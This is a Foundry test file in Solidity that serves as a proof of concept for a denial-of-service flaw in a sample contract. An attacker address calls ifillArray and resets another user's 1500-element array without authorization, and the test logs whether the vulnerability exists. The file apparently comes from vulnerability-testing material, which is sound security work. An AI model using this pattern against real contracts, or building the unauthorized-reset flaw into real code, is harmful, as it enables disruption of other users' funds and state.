// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/dos_simple.sol";

contract DOS_ArrayReset_Test is Test {
    DosOneFunc public dosContract;
    address user = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        dosContract = new DosOneFunc();
    }
    
    function test_UnauthorizedArrayReset() public {
        // Fill array to meet minimum threshold (1500 elements)
        vm.startPrank(user);
        for (uint i = 0; i < 5; i++) {
            dosContract.ifillArray();
        }
        vm.stopPrank();
        
        // Get pre-attack state
        console.log("--- BEFORE-Trigger State ---");
        (, uint arraySizeBefore) = dosContract.getParticipantStats(user);
        uint resetCountBefore = dosContract.arrayResetCount();
        console.log("Array length before attack:", arraySizeBefore);
        console.log("Reset counter before attack:", resetCountBefore);
        assertGe(arraySizeBefore, 1500, "Array should have at least 1500 elements");
        
        console.log("--- Trigger Attacker Action ---");
        // Attacker resets the array without authorization
        vm.prank(attacker);
        bool result = dosContract.ifillArray();
        
        // Get post-attack state
        console.log("--- AFTER-Trigger State ---");
        (, uint arraySizeAfter) = dosContract.getParticipantStats(user);
        uint resetCountAfter = dosContract.arrayResetCount();
        console.log("Array length after attack:", arraySizeAfter);
        console.log("Reset counter after attack:", resetCountAfter);
        
        // Original assertions preserved
        assertFalse(result, "Function should return false (reset case)");
        assertEq(arraySizeAfter, 0, "Array should be reset to 0 length");
        
        // Differential condition check
        bool arrayReset = (arraySizeAfter == 0);
        bool counterIncreased = (resetCountAfter > resetCountBefore);
        
        // Final vulnerability verdict
        if (arrayReset && counterIncreased) {
            console.log("Vulnerability Exists: Unauthorized array reset and counter incremented");
        } else {
            console.log("Vulnerability not Exist: No state change detected");
        }
    }
}